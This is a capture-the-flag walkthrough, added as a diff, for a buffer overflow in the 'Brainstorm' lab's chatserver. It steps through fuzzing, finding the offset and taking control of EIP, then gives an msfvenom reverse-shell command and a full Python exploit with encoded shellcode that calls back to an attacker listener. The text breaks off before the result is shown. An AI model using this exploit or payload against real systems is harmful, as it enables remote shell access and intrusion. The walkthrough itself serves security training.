@@ -1,0 +1,177 @@
+Brainstorm Buffer Overflow Walkthrough
+
+• After enumerating the machine we find an ftp server that allows Anonymous login.
+• After logging in we find a program called chatserver and a DLL for it.
+• They are corrupted though so we change the prompt to off and transfer mode “bin” and download them again with "mget *".
+
+• Once we have the files, we transfer them to our windows virtual machine.
+
+• Open Immunity Debugger on our windows VM as Administrator and open “chatserver” in Immunity.
+• Make sure you can connect to the chatserver on your VM from our Kali machine like you can on the vulnerable machine.
+• Now we can start testing the chatserver to see if it is vulnerable to Buffer Overflow attack.
+• We start by generating 1000 A's with the command python -c ‘print “A” * 1000’ 
+• We increase in increments of 500 until the program crashes.
+
+• The Message area in the chatserver crashes at 2500 characters!
+• In imunity debugger we can see the “Access violation when executing 41414141” 
+
+
+• This is our AAAA from the very large string we passed into the chat server above!
+• This also confirms that we can cause a buffer overflow!
+• Now we just need to find the exact number of characters to send so that we can take control of the EIP.
+• We can use meterpreter or Mona to generate a string for this!
+Mona: !mona pattern_create 2500
+Meterpreter: msf-pattern_create -l 2500
+
+• Now we can send our crafted payload to the message input in the chatserver again.
+• Once the program has crashed, check the EIP in Immunity.
+
+• Now we need to find the offset!
+• We can do this in two ways:
+Mona: !mona pattern_offset <Crashed_EIP_Value>
+Meterpreter: msf-pattern_offset -l 2500 -q <Crashed_EIP_Value>
+	Output: [*] Exact match at offset 2012
+
+• Now we need to start crafting our python script! 
+• I started with this starter script:
+
+#!/usr/bin/python 
+
+import socket,sys
+
+address = '127.0.0.1'
+port = 9999
+buffer = #TBD
+
+try:
+	print '[+] Sending buffer'
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((address,port))
+	s.recv(1024)		
+	s.send(buffer + '\r\n')
+except:
+ 	print '[!] Unable to connect to the application.'
+ 	sys.exit(0)
+finally:
+	s.close()
+	
+• And ended up with this script:
+
+#!/usr/bin/python 
+
+import socket,sys
+
+address = '192.168.74.129'
+port = 9999
+user = 'RoseHacks'        # Added user to input into the chatserver program 
+message = 'A' * 2012  # Added message to input into the chatserver program. 2012 which is our offset value.
+
+try:
+        print '[+] Sending buffer'
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((address,port))
+        s.recv(1024)
+        s.recv(1024)
+        s.send(user + '\r\n')   # Send our user
+        s.recv(1024)
+        s.send(message + '\r\n')    # Send our message
+except:
+        print '[!] Unable to connect to the application.'
+        sys.exit(0)
+finally:
+        s.close()
+• We input our Windows VM IP address and port number.
+• We also need to input our user and message that the program is asking for:
+   ◇ Add user into the script with: 
+   ◇ s.send(user +'\r\n')
+• We know that 2012 characters will cause the app to crash from the offset above.
+• We save the ecript as buffer.py, make it executable, and then run it against chatserver on our windows VM.
+
+
+• It crashes the program, which is exactly what we were looking to happen!
+
+Control The EIP
+
+• To confirm that we can overwrite the EIP, we will add a line to our script. 
+• Now it should look like:
+	message = 'A' * 2012
+	message += 'B' * 4
+• We are very simply adding some “B” characters to the end of our 2012 “A” characters.
+• After running the script against our WIndows VM, we check immunity:
+
+• 42424242 = Thats our B's !!!
+• We have successfully taken control of the EIP.
+
+Checking For Bad Characters
+• It is important to check for bad characters because sending any will cause the program to stop before executing our code.
+• So now we add another message line to script. We can find bad characters here: https://github.com/cytopia/badchars
+• It should look like:
+message = 'A' * 3000
+message += 'B' * 4
+message += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\"
+<SNIP>
+• Now we run our script again, and then check the register in Immunity.
+• Find out where the B's start
+• Check to make sure all the bad characters are there in reverse.
+
+• After checking the whole list, we find that all the characters are there.
+
+• The final step is to find the location of the ESP.
+• We can do this by using mona in Immunity:
+!mona jmp -r esp
+• Our results:
+
+• We take the first one change it to the correct Little Endian format for our script.
+• Now we need to grab the payload we will use.
+• Using msfvenom:
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.20 LPORT=1234 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00"
+Explanation of the parameters used:
+
+
+• Now we have all the information needed to run our script:
+
+address = '192.168.74.129'
+port = 9999
+user = 'rosehacks'
+buf =  b""
+buf += b"\xda\xde\xd9\x74\x24\xf4\xbe\x41\x69\x3d\xbb\x5a\x33"
+buf += b"\xc9\xb1\x52\x31\x72\x17\x03\x72\x17\x83\xab\x95\xdf"
+buf += b"\x4e\xd7\x8e\xa2\xb1\x27\x4f\xc3\x38\xc2\x7e\xc3\x5f"
+buf += b"\x87\xd1\xf3\x14\xc5\xdd\x78\x78\xfd\x56\x0c\x55\xf2"
+buf += b"\xdf\xbb\x83\x3d\xdf\x90\xf0\x5c\x63\xeb\x24\xbe\x5a"
+buf += b"\x24\x39\xbf\x9b\x59\xb0\xed\x74\x15\x67\x01\xf0\x63"
+buf += b"\xb4\xaa\x4a\x65\xbc\x4f\x1a\x84\xed\xde\x10\xdf\x2d"
+buf += b"\xe1\xf5\x6b\x64\xf9\x1a\x51\x3e\x72\xe8\x2d\xc1\x52"
+buf += b"\x20\xcd\x6e\x9b\x8c\x3c\x6e\xdc\x2b\xdf\x05\x14\x48"
+buf += b"\x62\x1e\xe3\x32\xb8\xab\xf7\x95\x4b\x0b\xd3\x24\x9f"
+buf += b"\xca\x90\x2b\x54\x98\xfe\x2f\x6b\x4d\x75\x4b\xe0\x70"
+buf += b"\x59\xdd\xb2\x56\x7d\x85\x61\xf6\x24\x63\xc7\x07\x36"
+buf += b"\xcc\xb8\xad\x3d\xe1\xad\xdf\x1c\x6e\x01\xd2\x9e\x6e"
+buf += b"\x0d\x65\xed\x5c\x92\xdd\x79\xed\x5b\xf8\x7e\x12\x76"
+buf += b"\xbc\x10\xed\x79\xbd\x39\x2a\x2d\xed\x51\x9b\x4e\x66"
+buf += b"\xa1\x24\x9b\x29\xf1\x8a\x74\x8a\xa1\x6a\x25\x62\xab"
+buf += b"\x64\x1a\x92\xd4\xae\x33\x39\x2f\x39\xfc\x16\x2f\xad"
+buf += b"\x94\x64\x2f\xc9\xb6\xe0\xc9\xbb\x26\xa5\x42\x54\xde"
+buf += b"\xec\x18\xc5\x1f\x3b\x65\xc5\x94\xc8\x9a\x88\x5c\xa4"
+buf += b"\x88\x7d\xad\xf3\xf2\x28\xb2\x29\x9a\xb7\x21\xb6\x5a"
+buf += b"\xb1\x59\x61\x0d\x96\xac\x78\xdb\x0a\x96\xd2\xf9\xd6"
+buf += b"\x4e\x1c\xb9\x0c\xb3\xa3\x40\xc0\x8f\x87\x52\x1c\x0f"
+buf += b"\x8c\x06\xf0\x46\x5a\xf0\xb6\x30\x2c\xaa\x60\xee\xe6"
+buf += b"\x3a\xf4\xdc\x38\x3c\xf9\x08\xcf\xa0\x48\xe5\x96\xdf"
+buf += b"\x65\x61\x1f\x98\x9b\x11\xe0\x73\x18\x31\x03\x51\x55"
+buf += b"\xda\x9a\x30\xd4\x87\x1c\xef\x1b\xbe\x9e\x05\xe4\x45"
+buf += b"\xbe\x6c\xe1\x02\x78\x9d\x9b\x1b\xed\xa1\x08\x1b\x24"
+esp = '\xdf\x14\x50\x62'
+nop = '\x90'*20
+
+message = 'A' * 2012 #The number of characters needed to crash the application.
+message += esp  #The value of the ESP that will instruct the application to execute our code. 
+message += nop #Our code could be cut off, and so adding a NOP sled ensures it works.
+message += buf #Our shellcode we generated with msfvenom
+
+• Now we start a netcat listener on our attacking machine. Make sure the chatserver is running on our Windows VM, and finally run our script.
+
+And...
+
+
+
